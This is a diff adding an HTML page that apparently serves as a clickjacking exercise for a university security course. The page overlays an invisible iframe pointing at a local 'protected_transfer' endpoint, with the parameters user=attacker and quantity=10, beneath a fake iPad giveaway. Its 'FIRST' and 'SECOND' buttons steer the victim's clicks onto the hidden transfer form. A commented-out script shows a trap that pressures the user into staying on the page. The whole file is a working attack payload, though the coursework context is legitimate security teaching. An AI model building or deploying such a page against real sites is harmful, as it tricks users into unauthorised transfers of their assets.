@@ -1,0 +1,35 @@
+<html>
+<head>
+<style>
+#parentDiv { position:relative; }
+#childDiv { position:absolute; left:0px; top:0px; opacity: 0 }
+</style>
+</head>
+
+<body id="parentDiv" bgcolor="green">
+
+<iframe sandbox="allow-scripts allow-forms" id="childDiv" width="800px" height="800px" scrolling="no" src="http://localhost:3000/protected_transfer?user=attacker&quantity=10"></iframe>
+
+<div style="position: absolute; left: 10px; top: 10px;"><h1>Hey - we're giving away iPad minis!!! <h1></div>
+<div style="position: absolute; left: 800px; top: 70px;">
+  <img src="http://9to5mac.files.wordpress.com/2012/10/ipadmini.png" width="500">
+</div>
+<div style="position: absolute; left: 50px; top: 50px;"><h1>CLICK THE BUTTONS IN ORDER AND VOILA!!!<h1></div>
+<input type="button" style="position: absolute; left: 18px; top: 335px; color: red; font-weight: bold; z-index:-1" value="FIRST"></input>
+
+<input type="button" style="position: absolute; left: 100px; top: 335px; color: blue; font-weight: bold;" value="SECOND" onclick="showMore()"></input>
+
+<script>
+function showMore(){
+document.location="http://pages.cs.wisc.edu/~rist/642-fall-2014/.";
+}
+/*
+window.onbeforeunload = function() {
+
+  window.onbeforeunload = null
+  return "You are leaving in middle of a critical operation PLEASE CLICK 'STAY ON THIS PAGE'"
+}
+*/
+</script>
+</body>
+</html>
